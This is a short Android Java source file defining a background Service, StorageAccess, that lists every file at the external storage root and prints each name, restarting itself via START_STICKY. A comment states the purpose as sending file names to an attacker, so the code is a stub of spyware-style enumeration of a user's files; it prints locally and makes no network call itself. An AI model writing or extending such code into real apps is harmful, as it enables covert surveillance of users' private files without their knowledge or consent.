package com.example.myapp;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;

public class StorageAccess extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Access external storage
        File storageDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath());

        File[] files = storageDir.listFiles();
        if (files != null) {
            for (File file : files) {
                // Process each file (e.g., send file names to attacker)
                System.out.println("File: " + file.getName());
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
